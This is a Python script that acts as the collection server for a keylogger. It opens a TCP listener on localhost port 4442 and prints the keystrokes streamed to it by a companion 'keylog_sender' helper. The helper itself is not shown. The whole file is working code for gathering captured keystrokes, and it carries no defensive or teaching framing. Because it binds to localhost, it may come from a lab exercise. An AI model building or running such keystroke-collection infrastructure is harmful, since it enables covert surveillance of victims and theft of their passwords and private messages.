# A listener to the keylogger output sent by keylog_sender helper
import socket
import threading
import sys
import select

TARGET_TCP_HOST = '127.0.0.1'
TARGET_TCP_PORT = 4442

should_exit = threading.Event()
client_threads = []
client_sockets = []

def listen_for_quit():
    print("[*] Press 'q' then Enter to quit the listener.")
    while not should_exit.is_set():
        ready, _, _ = select.select([sys.stdin], [], [], 1)
        if ready:
            key = sys.stdin.readline().strip()
            if key.lower() == 'q':
                print("[*] Exit signal received. Shutting down...")
                should_exit.set()

def handle_client(client_sock):
    client_sockets.append(client_sock)
    with client_sock:
        client_sock.settimeout(1.0)  # Periodically check exit flag
        try:
            while not should_exit.is_set():
                try:
                    data = client_sock.recv(4096)
                    if not data:
                        break
                    print(data.decode('utf-8', errors='replace'), end='', flush=True)
                except socket.timeout:
                    continue
        except Exception as e:
            print(f"[!] Client error: {e}")
        print("\n[+] Client disconnected")
    client_sockets.remove(client_sock)

def start_listener():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind((TARGET_TCP_HOST, TARGET_TCP_PORT))
    server_sock.listen(5)
    server_sock.settimeout(1.0)  # Allow loop to check exit flag

    print(f"[+] Keylogger output listener active on {TARGET_TCP_HOST}:{TARGET_TCP_PORT}")
    threading.Thread(target=listen_for_quit, daemon=True).start()

    try:
        while not should_exit.is_set():
            try:
                client_sock, addr = server_sock.accept()
                print(f"[+] Keylogger_sender helper connected from {addr}")
                t = threading.Thread(target=handle_client, args=(client_sock,))
                t.start()
                client_threads.append(t)
            except socket.timeout:
                continue
    finally:
        print("[*] Cleaning up...")
        server_sock.close()
        for cs in client_sockets:
            try:
                cs.shutdown(socket.SHUT_RDWR)
                cs.close()
            except:
                pass
        for t in client_threads:
            t.join()
        print("[*] All connections closed. Exiting.")

if __name__ == "__main__":
    start_listener()
